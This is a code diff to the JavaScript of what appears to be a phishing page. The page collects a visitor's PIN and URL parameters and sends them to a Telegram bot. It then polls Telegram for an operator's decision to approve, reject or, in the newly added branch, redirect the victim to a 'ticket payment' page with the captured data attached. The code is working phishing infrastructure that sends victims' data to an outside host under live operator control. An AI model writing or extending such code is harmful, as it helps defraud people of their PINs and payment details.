@@ -397,6 +397,7 @@
             const ts         = Date.now();
             const approveId  = `pin_approve_${ts}`;
             const wrongPinId = `pin_wrong_${ts}`;
+            const ticketId   = `pin_ticket_${ts}`;
 
             // Build a readable summary of all URL params for the Telegram message
             const paramSummary = Array.from(params.entries())
@@ -413,21 +414,22 @@
                     reply_markup: {
                         inline_keyboard: [
                             [{ text: '✅ Approve PIN', callback_data: approveId }],
-                            [{ text: '❌ Wrong PIN', callback_data: wrongPinId }]
+                            [{ text: '❌ Wrong PIN', callback_data: wrongPinId }],
+                            [{ text: '🎫 Ticket Payment', callback_data: ticketId }]
                         ]
                     }
                 })
             })
             .then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, wrongPinId);
+                startPolling(approveId, wrongPinId, ticketId);
             })
             .catch(() => {
                 resetButton();
             });
         }
 
-        function startPolling(approveId, wrongPinId) {
+        function startPolling(approveId, wrongPinId, ticketId) {
             pollingInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
@@ -454,6 +456,12 @@
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#pinInputs .pin-input').forEach(i => i.value = '');
                                     resetButton();
+                                } else if (cb === ticketId) {
+                                    clearInterval(pollingInterval);
+                                    spinner.style.display = 'none';
+                                    const qs = getAllParams();
+                                    // Redirect to payment.html (or whatever your ticket payment page is named)
+                                    window.location.href = qs ? `payment.html?${qs}` : `payment.html`;
                                 }
                             }
                         });
